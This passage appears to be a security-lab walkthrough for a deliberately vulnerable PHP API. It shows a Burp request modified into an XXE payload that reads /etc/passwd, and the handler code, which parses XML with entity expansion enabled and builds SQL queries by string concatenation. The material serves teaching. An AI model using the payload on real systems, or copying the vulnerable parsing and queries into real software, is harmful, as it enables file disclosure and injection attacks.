- from the documentation of api copy and paste put request to the burp repeater

#### request

request contains xml entity so we can check xml external entity injection

```
PUT /v1/users.php?format=json HTTP/1.1
HOST: 192.168.254.1
Content-Length: 265

<?xml version="1.0" standalone="yes"?>
<updatepassword>
<user>
<username>securestore</username>
<newpassword>securestore</newpassword>
<cnfnewpassword>securestore</cnfnewpassword>
<token>212174768840da1c6a1604c8b485a0ee</token>
</user>
</updatepassword>
```

![Image](/img/xmlentity.png)

change xml payload with xxe attack

```
PUT /v1/users.php?format=json HTTP/1.1
HOST: 192.168.254.1
Content-Length: 350

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<updatepassword>
<user>
<username>&xxe;</username>
<newpassword>securestore</newpassword>
<cnfnewpassword>securestore</cnfnewpassword>
<token>212174768840da1c6a1604c8b485a0ee</token>
</user>
</updatepassword>
```

![Image](/img/xxeattack.png)

#### Vulnerable Code of the XXE

```
else if($_SERVER['REQUEST_METHOD'] == "PUT") {

    $input = file_get_contents("php://input");

    $updatepassword = simplexml_load_string($input,'SimpleXMLElement',LIBXML_NOENT);

    $username = $updatepassword->user->username;
    $newpassword = $updatepassword->user->newpassword;
    $cnfnewpassword = $updatepassword->user->cnfnewpassword;
    $token = $updatepassword->user->token;

    if(!empty($username)&&!empty($newpassword)&&!empty($cnfnewpassword)&&!empty($token))
    {
    if($newpassword!=$cnfnewpassword){
    $response['code'] = 0;
    $response['status'] = $api_response_code[ $response['code'] ]['HTTP Response'];
    $response['data'] = 'Passwords didnt match';
    }
    else{

    $selectquer = $mysqli->query("SELECT * FROM user WHERE username='".$username." 'and token='".$token." ' ");

    if($selectquer->num_rows > 0) {

    $updatequer = $mysqli->query("UPDATE user set password='$newpassword' where username='$username' ");

    if($updatequer){
    $response['code'] = 1;
    $response['status'] = $api_response_code[ $response['code'] ]['HTTP Response'];
    $response['data']['user'] = $username;
    $response['data']['message'] = 'update success';
    }
    else{
    $response['code'] = 1;
    $response['status'] = $api_response_code[ $response['code'] ]['HTTP Response'];
    $response['data']['user'] = $username;
    $response['data']['message'] = 'update not success';
    }
    }
    else
    {
    $response['code'] = 1;
    $response['status'] = $api_response_code[ $response['code'] ]['HTTP Response'];
    $response['data']['user'] = $username;
    $response['data']['message'] = 'invalid user';
    }
    }
    }
    else
    {
    $response['code'] = 0;
    $response['status'] = $api_response_code[ $response['code'] ]['HTTP Response'];
    $response['data']['user'] =  'unknown';
    $response['data']['message'] = 'incomplete';
    }
}

```
